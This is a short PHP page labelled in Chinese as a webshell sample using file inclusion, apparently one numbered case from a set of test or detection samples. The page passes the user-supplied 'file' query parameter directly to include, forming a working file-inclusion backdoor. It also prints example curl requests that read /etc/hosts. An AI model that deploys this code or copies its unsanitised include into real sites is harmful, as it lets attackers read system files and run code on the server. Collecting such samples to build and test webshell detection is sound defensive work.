<?php
	$linux1 = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?file=/etc/hosts';
	$linux2 = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?file=file:///etc/hosts';
?>

<html>
<head>
	<meta charset="UTF-8"/>
	<title>016 - WebShell - 文件包含方式</title>

</head>

<body>
	<h1>016 - WebShell - 文件包含方式</h1>

	<p>不正常调用</p>
	<pre>curl '<a href="<?php echo $linux1 ?>" target="_blank"><?php echo $linux1 ?></a>'</pre>
	<br>
	
	<p>不正常调用 - 带协议</p>
	<pre>curl '<a href="<?php echo $linux2 ?>" target="_blank"><?php echo $linux2 ?></a>'</pre>

	<br>
	<p>包含内容</p>

<?php 
	if (isset ($_GET['file']))
	{
		include $_GET['file'];
	}
?>

</body>
</html>
